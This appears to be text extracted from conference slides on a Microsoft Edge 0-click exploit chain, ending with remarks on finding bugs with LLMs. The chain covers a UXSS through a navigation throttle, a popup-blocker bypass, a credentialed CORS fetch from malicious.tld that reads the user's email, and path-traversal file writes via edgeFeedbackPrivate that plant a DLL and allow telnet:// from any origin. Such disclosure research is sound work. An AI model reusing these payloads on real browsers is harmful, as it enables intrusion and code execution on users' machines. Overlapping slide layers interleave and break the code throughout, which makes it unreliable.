         const GURL last_committed_url = web_contents->GetLastCommittedURL();
       Must fire from a trusted domain
if ( !IsSupportedLoginUrl(last_committed_url) )
        if ( !IsSupportedLoginUrl(last_committed_url) )
    return  content::NavigationThrottle::CANCEL_AND_IGNORE;
             return content::NavigationThrottle::CANCEL_AND_IGNORE;

         // Some authority checks […]

         const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
• https://login.live.com
         NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
• https://login.microsoftonline.com
         params.disposition = WindowOpenDisposition::CURRENT_TAB;
• https://login.microsoft.com
         params.window_action = NavigateParams::SHOW_WINDOW;
• https://login.usgovcloudapi.net
         Navigate(&params);
• …
    Can you spot the vulnerability?
    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest()
content::WebContents*                                                        {
                          web_contents = navigation_handle()->GetWebContents();
const GURL  last_committed_url
        content::WebContents*       = web_contents->GetLastCommittedURL();
                              web_contents = navigation_handle()->GetWebContents();
         const GURL last_committed_url = web_contents->GetLastCommittedURL();
if ( !IsSupportedLoginUrl(last_committed_url) )
        if ( !IsSupportedLoginUrl(last_committed_url) )
    return  content::NavigationThrottle::CANCEL_AND_IGNORE;
             return content::NavigationThrottle::CANCEL_AND_IGNORE;

         // Some authority checks […]

         const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
• https://login.live.com
         NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
• https://login.microsoftonline.com                 Find Open Redirect
         params.disposition = WindowOpenDisposition::CURRENT_TAB;
• https://login.microsoft.com                           or XSS Here?
         params.window_action = NavigateParams::SHOW_WINDOW;
• https://login.usgovcloudapi.net
         Navigate(&params);
• …
    Can you spot the vulnerability
           https://malicious.tld

    again?    網址有抓對嗎？

     ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest()
content::WebContents*      web_contents     =                                  {
                                               navigation_handle()->GetWebContents();
   popup = window.open(
const 'https://login.live.com/',
       GURL   last_committed_url
         content::WebContents*       = web_contents->GetLastCommittedURL();
                               web_contents
                                  '_blank')  = navigation_handle()->GetWebContents();
         const GURL last_committed_url = web_contents->GetLastCommittedURL();
if ( !IsSupportedLoginUrl(last_committed_url) )
        if ( !IsSupportedLoginUrl(last_committed_url) )
    return  content::NavigationThrottle::CANCEL_AND_IGNORE;
                                                      https://login.live.com
              return content::NavigationThrottle::CANCEL_AND_IGNORE;

         // Some authority checks […]

         const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

         NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
         params.disposition = WindowOpenDisposition::CURRENT_TAB;
         params.window_action = NavigateParams::SHOW_WINDOW;

         Navigate(&params);
    Can you spot the vulnerability
          https://malicious.tld

    again?    網址有抓對嗎？
                                                        Missing Opener Check
     ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest()
content::WebContents*      web_contents     =                                  {
                                               navigation_handle()->GetWebContents();
   popup = window.open(
const 'https://login.live.com/',
       GURL   last_committed_url
         content::WebContents*       = web_contents->GetLastCommittedURL();
                               web_contents
                                  '_blank')  = navigation_handle()->GetWebContents();
        const GURL
  popup.location   last_committed_url = web_contents->GetLastCommittedURL();
                 = `https://guidance-ca-
if ( !IsSupportedLoginUrl(last_committed_url)
      error/31337?switch_profile=...`
                                                         )
        if ( !IsSupportedLoginUrl(last_committed_url) )
    return   content::NavigationThrottle::CANCEL_AND_IGNORE;
                                                      https://login.live.com
            return content::NavigationThrottle::CANCEL_AND_IGNORE;

         // Some authority checks […]

         const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

         NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
         params.disposition = WindowOpenDisposition::CURRENT_TAB;
         params.window_action = NavigateParams::SHOW_WINDOW;

         Navigate(&params);
    Can you spot the vulnerability?
    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest()
content::WebContents*                                                        {
                          web_contents = navigation_handle()->GetWebContents();
                                                                     BYPASSING
const GURL  last_committed_url
        content::WebContents*       = web_contents->GetLastCommittedURL();
                              web_contents = navigation_handle()->GetWebContents();
         const GURL last_committed_url = web_contents->GetLastCommittedURL();

    return
              Needs a manual tab switch
if ( !IsSupportedLoginUrl(last_committed_url) )
        if ( !IsSupportedLoginUrl(last_committed_url) )
            content::NavigationThrottle::CANCEL_AND_IGNORE;
             return content::NavigationThrottle::CANCEL_AND_IGNORE;

         // Some authority checks […]

         const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
• https://login.live.com
         NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
• https://login.microsoftonline.com
         params.disposition = WindowOpenDisposition::CURRENT_TAB;
• https://login.microsoft.com
         params.window_action = NavigateParams::SHOW_WINDOW;
• https://login.usgovcloudapi.net
         Navigate(&params);
• …
  Can you    spot the vulnerability?
       https://login.live.com

   ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
                  Switch to Another Tab?
       content::WebContents* web_contents = navigation_handle()->GetWebContents();
       const GURL last_committed_url = web_contents->GetLastCommittedURL();

       if ( !IsSupportedLoginUrl(last_committed_url) )
           return content::NavigationThrottle::CANCEL_AND_IGNORE;
➔ setTimeout(function(){
     // Some authority checks […]
     location = `https://guidance-ca-error/31337?email=[...]&
       const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
        switch_profile=javascript:alert(origin)//`
    }, NavigateParams
        10000)        params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
       params.disposition = WindowOpenDisposition::CURRENT_TAB;
       params.window_action = NavigateParams::SHOW_WINDOW;

       Navigate(&params);
  Can you    spot the vulnerability?
       https://login.live.com

   ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

      content::WebContents* web_contents = navigation_handle()->GetWebContents();
      const GURL last_committed_url = web_contents->GetLastCommittedURL();

      if ( !IsSupportedLoginUrl(last_committed_url) )
          return content::NavigationThrottle::CANCEL_AND_IGNORE;
   setTimeout(function(){
       // Some authority checks […]
     location = `https://guidance-ca-error/31337?email=[...]&
       const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
        switch_profile=javascript:alert(origin)//`
    }, NavigateParams
        10000)        params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
      params.disposition = WindowOpenDisposition::CURRENT_TAB;

➔ newin
      params.window_action = NavigateParams::SHOW_WINDOW;
  popup = window.open('https://google.com',
          window.open('https://attacker.com',
                                            '_blank')
                                              '_blank')
      Navigate(&params);
setTimeout(function(){
    location.href = `https://guidance-ca-error/31337?
        emailaddress=${email}&
        switch_profile=javascript:alert(origin)//`
}, 10000)

window.open('https://google.com', '_blank')
window.open('https://google.com', '_blank')


            Popup Blocker
chromium/chrome/browser/chr
ome_content_browser_client.cc
bool ChromeContentBrowserClient::CanCreateWindow(
    RenderFrameHost* opener,
    ...)
{

   /*
        popup blocker logic here…
   */

 return blocked_content::MaybeBlockPopup(
             web_contents, ...) != nullptr;
}
chromium/chrome/browser/chr
ome_content_browser_client.cc
bool ChromeContentBrowserClient::CanCreateWindow(
    RenderFrameHost* opener,
    ...)
{                        Microsoft added one more
   /*                         whitelist origin...
        popup blocker logic here…
   */

 return blocked_content::MaybeBlockPopup(
             web_contents, ...) != nullptr;
}
  Can you    spot the vulnerability?
       https://login.live.com

   ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

      content::WebContents* web_contents = navigation_handle()->GetWebContents();
      const GURL last_committed_url = web_contents->GetLastCommittedURL();

      if ( !IsSupportedLoginUrl(last_committed_url) )
          return content::NavigationThrottle::CANCEL_AND_IGNORE;
   setTimeout(function(){
      // Some authority checks […]
     location = `https://guidance-ca-error/31337?email=[...]&
      const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
       switch_profile=javascript:alert(origin)//`
   }, 10000)
      NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
      params.disposition = WindowOpenDisposition::CURRENT_TAB;

➔ newin
      params.window_action = NavigateParams::SHOW_WINDOW;
  popup = window.open('https://google.com',
          window.open('https://attacker.com',
                                            '_blank')
                                              '_blank')
      Navigate(&params);
  Can you   spot the vulnerability?
       about:blank#quickAuthPopup

   ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

                              Got a new tab
      content::WebContents* web_contents = navigation_handle()->GetWebContents();
      const GURL last_committed_url = web_contents->GetLastCommittedURL();

      if ( !IsSupportedLoginUrl(last_committed_url) )
          return content::NavigationThrottle::CANCEL_AND_IGNORE;
   setTimeout(function(){
      // Some authority checks […]
     location = `https://guidance-ca-error/31337?email=[...]&
      const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
       switch_profile=javascript:alert(origin)//`
   }, 10000)
      NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
      params.disposition = WindowOpenDisposition::CURRENT_TAB;

➔ newin
      params.window_action = NavigateParams::SHOW_WINDOW;
  popup = window.open('https://google.com',
          window.open('about:blank#quickAuthPopup',
                                            '_blank')
                                                    '_blank')
      Navigate(&params);
Can you      spot the vulnerability?
     https://attacker.com
    https://attacker.com


    ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

       content::WebContents* web_contents = navigation_handle()->GetWebContents();
       const GURL last_committed_url = web_contents->GetLastCommittedURL();

       if ( !IsSupportedLoginUrl(last_committed_url) )
           return content::NavigationThrottle::CANCEL_AND_IGNORE;
    setTimeout(function(){
       // Some authority checks […]
      location = `https://guidance-ca-error/31337?email=[...]&
       const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
        switch_profile=javascript:alert(origin)//`
    }, 10000)
       NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
       params.disposition = WindowOpenDisposition::CURRENT_TAB;
       params.window_action = NavigateParams::SHOW_WINDOW;
    popup = window.open('about:blank#quickAuthPopup', '_blank')
➔   popup.location     = 'https://attacker.com'
       Navigate(&params);
                          BYPASSING

Needs a signed -in user session
                           BYPASSING

Must know the login email first
IsSupportedLoginUrl
Keep reversing Just hack a
 for new bugs Microsoft site
https://assets.msn.com/service/community/users/me?profile=social&it=edgeid




                                  CORS Misconfiguration…
   Can you spot the vulnerability
         https://malicious.tld

   again?    網址有抓對嗎？
    resp = await fetch(`https://[…]`, {
        method: 'GET', mode:
     ThrottleCheckResult       'cors',
                         EdgeCAGuidanceNavigationThrottle::WillStartRequest()  {
content::WebContents*      web_contents = navigation_handle()->GetWebContents();
        credentials: 'include', […]
const
    }) GURL  last_committed_url
         content::WebContents*        = web_contents->GetLastCommittedURL();
                                web_contents = navigation_handle()->GetWebContents();
         const
    body =     GURL
           await    last_committed_url = web_contents->GetLastCommittedURL();
                 resp.json()
if (console.log(
      !IsSupportedLoginUrl(last_committed_url)
                 body.value[0].email )                    )
         if ( !IsSupportedLoginUrl(last_committed_url) )
     return  content::NavigationThrottle::CANCEL_AND_IGNORE;
             return content::NavigationThrottle::CANCEL_AND_IGNORE;

        // Some authority checks […]
                                                 assets.msn.com                     200 ok
             fetch(…) with cookies
        const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
                                              > Access-Control-Allow-Origin:
        NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
                                                 https://malicious.tld/
        params.disposition = WindowOpenDisposition::CURRENT_TAB;
        params.window_action = NavigateParams::SHOW_WINDOW;
                                              > Access-Control-Allow-Credentials:
        Navigate(&params);                      true
                           ALL CLEAR

Must know the login email first
IsSupportedLoginUrl
Building a Microsoft Edge Full
Chain — 60%
                                                          0-Click
• (Bug 1) – Browser-Initiated Source-less Navigation → UXSS         UXSS
                                                            Primitive
   ∟ (Bug 2)   – Insufficient Origin Validation
   ∟ (Bug 3)   – Popup Window Blocker bypass
   ∟ (Feature) – Windows OneAuth Autologon
   ∟ (Bug 4)   – CORS Misconfiguration
> Is UXSS still a thing?
Escalate UXSS to privileged
WebUI XSS
• edge://downloads
• edge://flags
• edge://settings
   ∟ chrome.settingsPrivate / chrome.management / chrome.passwordsPrivate
   ∟ Mojo / MojoHandle / MojoWatcher

• devtools://devtools/blank
   ∟ DevToolsAPI / DevToolsHost
  Escalate UXSS
BROWSER           to privileged
              RENDERER
                 Mojo IPC


  WebUI XSS
                              HandleRendererDebugURL
  • edge://downloads
  • edge://flags
  • edge://settings
    bool SchemeRegistry::ShouldTreatURLSchemeAsNotAllowingJavascriptURLs(
         const String& scheme) {
     ∟ chrome.settingsPrivate / chrome.management / chrome.passwordsPrivate
       DCHECK_EQ(scheme, scheme.LowerASCII());
      ∟ifMojo / MojoHandle / MojoWatcher
          (scheme.empty())
         return false;
  • devtools://devtools/blank
       return GetURLSchemesRegistry().
      ∟ DevToolsAPI  / DevToolsHost
         not_allowing_javascript_urls_schemes.Contains(scheme);
    }
 Escalate UXSS   to privileged
not_allowing_javascript_urls
BROWSER      RENDERER
                 Mojo IPC
                          檢查目標 URL 協議
 WebUI
_schemesXSS
                            HandleRendererDebugURL
  • edge://downloads
  • edge://
  • edge://flags
  • chrome://
  • edge://settings
    bool SchemeRegistry::ShouldTreatURLSchemeAsNotAllowingJavascriptURLs(
  • devtools://
        const String& scheme) {
     ∟ chrome.settingsPrivate / chrome.management / chrome.passwordsPrivate
       DCHECK_EQ(scheme, scheme.LowerASCII());
  • chrome-extension://
     ∟ Mojo / MojoHandle / MojoWatcher
       if (scheme.empty())
     chrome-untrusted://
  •• devtools://devtools/blank
         return false;
       return GetURLSchemesRegistry().
   • … ∟ DevToolsAPI / DevToolsHost
         not_allowing_javascript_urls_schemes.Contains(scheme);
     }
read://https_support.microsoft.com/?url=https://…
           read://https_support.microsoft.com/?url=https://…




                            Exposed                     Native C++




➔ chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles()
     Can you      spot the vulnerability?
          read://https_support.microsoft.com/?url=https://…


     ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

  Uncaught     TypeError:
       content::WebContents*      Error= in
                             web_contents        invocation of edgeFeedbac
                                            navigation_handle()->GetWebContents();
       const GURL last_committed_url = web_contents->GetLastCommittedURL();
kPrivate.zipDiagnosticLogFiles(string targetPathString,
       if ( !IsSupportedLoginUrl(last_committed_url) )
string data,      optional function callback): No matching
           return content::NavigationThrottle::CANCEL_AND_IGNORE;

signature.
       // Some authority checks […]

    at const
        <anonymous>:1:28
             GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

        NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
 ➔   chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles()
        params.disposition = WindowOpenDisposition::CURRENT_TAB;
        params.window_action = NavigateParams::SHOW_WINDOW;

         Navigate(&params);
   Can you      spot the vulnerability?
        read://https_support.microsoft.com/?url=https://…


➔ ThrottleCheckResult
  chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles(
                      EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
        'x.zip',
        content::WebContents* web_contents = navigation_handle()->GetWebContents();
        '{
        const GURL last_committed_url = web_contents->GetLastCommittedURL();

        if "logFiles":        {
           ( !IsSupportedLoginUrl(last_committed_url) )
            return content::NavigationThrottle::CANCEL_AND_IGNORE;
                 "ORANGE": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA…"
        // Some authority checks […]
           },
        const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
           "deviceInfo": {1337: 1337}
        NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
        }'
        params.disposition = WindowOpenDisposition::CURRENT_TAB;
        params.window_action = NavigateParams::SHOW_WINDOW;
    )
        Navigate(&params);
   Can you      spot the vulnerability?
        read://https_support.microsoft.com/?url=https://…


➔ ThrottleCheckResult
   chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles(
C:\Users\user\AppData\Local\Temp\<UUID>\ORANGE.json
                      EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
        'x.zip',
        content::WebContents* web_contents = navigation_handle()->GetWebContents();
        '{
        const GURL last_committed_url = web_contents->GetLastCommittedURL();

        if "logFiles":        {
           ( !IsSupportedLoginUrl(last_committed_url) )
            return content::NavigationThrottle::CANCEL_AND_IGNORE;
                 "ORANGE": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA…"
        // Some authority checks […]
           },
        const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
           "deviceInfo": {1337: 1337}
        NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
        }'
        params.disposition = WindowOpenDisposition::CURRENT_TAB;
        params.window_action = NavigateParams::SHOW_WINDOW;
    )
        Navigate(&params);
   Can you      spot the vulnerability?
        read://https_support.microsoft.com/?url=https://…


➔ ThrottleCheckResult
  chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles(
                      EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
        'x.zip',
        content::WebContents* web_contents = navigation_handle()->GetWebContents();
        '{
        const GURL last_committed_url = web_contents->GetLastCommittedURL();

        if "logFiles":        {
           ( !IsSupportedLoginUrl(last_committed_url) )
            return content::NavigationThrottle::CANCEL_AND_IGNORE;
               "../../../../../../../PWNED": "AAAAA…"
        // Some authority checks […]
           },
        const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
           "deviceInfo":
        NavigateParams           {1337:
                       params(browser,       1337}ui::PAGE_TRANSITION_LINK);
                                       profile_url,
        }'
        params.disposition = WindowOpenDisposition::CURRENT_TAB;
        params.window_action = NavigateParams::SHOW_WINDOW;
    )   Navigate(&params);
   Can you      spot the vulnerability?
        read://https_support.microsoft.com/?url=https://…


➔ ThrottleCheckResult
  chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles(
                      EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
        'x.zip',
        content::WebContents* web_contents = navigation_handle()->GetWebContents();
        '{
        const GURL last_committed_url = web_contents->GetLastCommittedURL();

        if "logFiles":        {
           ( !IsSupportedLoginUrl(last_committed_url) )
            return content::NavigationThrottle::CANCEL_AND_IGNORE;
                 "../../../../../../../pwned": "AAAAAAAAA…"
        // Some authority checks […]
           },
        const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
           "deviceInfo": {1337: 1337}
        NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
        }'
        params.disposition = WindowOpenDisposition::CURRENT_TAB;
        params.window_action = NavigateParams::SHOW_WINDOW;
    )
        Navigate(&params);
   Can you      spot the vulnerability?
        read://https_support.microsoft.com/?url=https://…


➔ ThrottleCheckResult
  chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles(
                      EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
        'x.zip',
        content::WebContents* web_contents = navigation_handle()->GetWebContents();
        '{
        const GURL last_committed_url = web_contents->GetLastCommittedURL();

        if "logFiles":        {
           ( !IsSupportedLoginUrl(last_committed_url) )
            return content::NavigationThrottle::CANCEL_AND_IGNORE;
               "../../../../../../../PWNED.TXT\\x00":"…"
        // Some authority checks […]
           },
        const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
           "deviceInfo":
        NavigateParams           {1337:
                       params(browser,       1337}ui::PAGE_TRANSITION_LINK);
                                       profile_url,
        }'
        params.disposition = WindowOpenDisposition::CURRENT_TAB;
        params.window_action = NavigateParams::SHOW_WINDOW;
    )   Navigate(&params);
   Can you      spot the vulnerability?
        read://https_support.microsoft.com/?url=https://…


➔ ThrottleCheckResult
  chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles(
                      EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
      'x.zip',
      content::WebContents* web_contents = navigation_handle()->GetWebContents();

 It works...
      '{
      const GURL last_committed_url = web_contents->GetLastCommittedURL();

      if "logFiles":        {
         ( !IsSupportedLoginUrl(last_committed_url) )
          return content::NavigationThrottle::CANCEL_AND_IGNORE;
               "../../../../../../../pwned": "AAAAAAAAA…"
      // Some authority checks […]
         },
      const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
         "deviceInfo": {1337: 1337}
      NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
      }'
      params.disposition = WindowOpenDisposition::CURRENT_TAB;
      params.window_action = NavigateParams::SHOW_WINDOW;
    )
        Navigate(&params);
Building a Microsoft Edge Full
Chain — 90%
• (Bug 1) – Browser-Initiated Source-less Navigation →    0-Click
                                                         0-Click   UXSS
                                                                 UXSS
   ∟ (Bug 2)   – Insufficient Origin Validation
   ∟ (Bug 3)   – Popup Window Blocker bypass
   ∟ (Feature) – Windows OneAuth Autologon
   ∟ (Bug 4)   – CORS Misconfiguration

• (Bug 5) – Arbitrary File Write on Privileged WebUI →   Browser AFW
From AFR to RCE
• Windows Startup Folder…?
  ∟

• Side Loading During Microsoft Edge Initializing…?
  ∟ Edge\User Data\Profile\Preferences
  ∟ Edge\User Data\Domain Actions\<ver>\domain_actions.dll
  ∟ Edge\User Data\**\*.json
Can you   spot the vulnerability?
     edge://restart

ThrottleCheckResult EdgeCAGuidanceNavigationThrottle::WillStartRequest() {

   content::WebContents* web_contents = navigation_handle()->GetWebContents();
   const GURL last_committed_url = web_contents->GetLastCommittedURL();

   if ( !IsSupportedLoginUrl(last_committed_url) )
       return content::NavigationThrottle::CANCEL_AND_IGNORE;

   // Some authority checks […]

   const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)

   NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
   params.disposition = WindowOpenDisposition::CURRENT_TAB;
   params.window_action = NavigateParams::SHOW_WINDOW;

   Navigate(&params);
   Can you      spot the vulnerability?
        read://https_support.microsoft.com/?url=https://…


➔ ThrottleCheckResult            UTF-8 Only
  chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles(
                      EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
        'x.zip',
        content::WebContents* web_contents = navigation_handle()->GetWebContents();
        '{
        const GURL last_committed_url = web_contents->GetLastCommittedURL();

        if "logFiles":        {
           ( !IsSupportedLoginUrl(last_committed_url) )
            return content::NavigationThrottle::CANCEL_AND_IGNORE;
              "PWNED.DLL": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        // Some authority checks […]
           },
        const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
           "deviceInfo": {1337: 1337}
        NavigateParams params(browser, profile_url, ui::PAGE_TRANSITION_LINK);
        }'
        params.disposition = WindowOpenDisposition::CURRENT_TAB;
        params.window_action = NavigateParams::SHOW_WINDOW;
    )
        Navigate(&params);
x86 → 0x014c
x64 → 0x8664




      ➔ https://github.com/corkami/pics/blob/master/binary/PE.png
   Can you      spot the vulnerability?
        read://https_support.microsoft.com/?url=https://…
          AutoLaunchProtocolsComponent\<ver>\protocols.json
➔ ThrottleCheckResult            UTF-8 Only
  chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles(
                      EdgeCAGuidanceNavigationThrottle::WillStartRequest() {
     { 'x.zip',
       content::WebContents* web_contents = navigation_handle()->GetWebContents();
       '{  "allow":
       const              [
             GURL last_committed_url = web_contents->GetLastCommittedURL();

                  {"origins":
       if "logFiles":        {         ["*"],"protocol":"telnet"}
          ( !IsSupportedLoginUrl(last_committed_url) )
           return content::NavigationThrottle::CANCEL_AND_IGNORE;
           ],"PWNED.DLL": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
       // Some authority checks […]
           "warn":
          },             [],
       const GURL profile_url = GetSwitchProfileUrlFromQuery(web_contents)
          "deviceInfo":
           "block":[]
       NavigateParams
                                {1337: 1337}
                      params(browser, profile_url, ui::PAGE_TRANSITION_LINK);

     } }'
       params.disposition = WindowOpenDisposition::CURRENT_TAB;
                                      telnet:// from any origin
       params.window_action = NavigateParams::SHOW_WINDOW;
    )
        Navigate(&params);
Windows Path Search Order
                        WoW64
• C:\WINDOWS\system32
• C:\WINDOWS
                                          WRITABLE
• C:\WINDOWS\System32\Wbem
        telnet.exe
• C:\WINDOWS\System32\WindowsPowerShell\v1.0
• C:\WINDOWS\System32\OpenSSH
• C:\Users\lowpriv\AppData\Local\Microsoft\WindowsApps
      DEMO
https://youtu.be/oZRT-8U0l1c
So why aren't you using AI?
      ∟ Just at good timing and luck
      ∟ The attack surface IS the vuln
      ∟ No AI sounds sick back then
So why aren't you using AI?
      ∟ Just at good timing and luck
      ∟ The attack surface IS the vuln
      ∟ No AI sounds sick back then
With LLMs…
• CVE-2026-58608 — Windows Printer Spooler RCE
  ∟ Microsoft Edge 0-Click full chain with SYSTEM privilege

• Google Chrome 0-Click full chain with logic bugs only?
  ∟ Not yet, but so close

• Code Execution on Calculator?
      DEMO
https://youtu.be/Bh1zglq4mLE
AI is a great tool, but only humans
  can define what is "interesting"
Thanks!
 orange_8361
 orange@chroot.org

 https://blog.orange.tw
